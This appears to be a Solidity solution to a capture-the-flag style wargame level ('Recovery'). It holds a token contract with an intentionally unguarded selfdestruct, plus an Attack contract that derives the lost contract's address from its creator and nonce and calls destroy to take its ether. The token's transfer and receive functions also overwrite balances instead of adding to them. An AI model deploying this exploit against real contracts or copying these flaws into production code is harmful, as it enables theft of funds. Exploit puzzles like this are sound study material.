// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    // generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

// 1. the token contract address can be obtained using etherscan transactions history
// 2. or recover the address using the algorithm on which a contract address generating is based
// https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed

contract Attack {
    function attack(address _factory) external {
        address tokenAddr = recover(_factory, 0x01);
        SimpleToken _token = SimpleToken(payable(tokenAddr));
        _token.destroy(payable(msg.sender));
    }

    function recover(address _creator, bytes1 _nonce) public pure returns(address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xd6), 
                bytes1(0x94), 
                _creator, 
                _nonce // 0x80 for zero nonce, 0x01 for second nonce, etc.
            )
        );
        // hash[12:] = address
        return address(uint160(uint256(hash)));
    }
}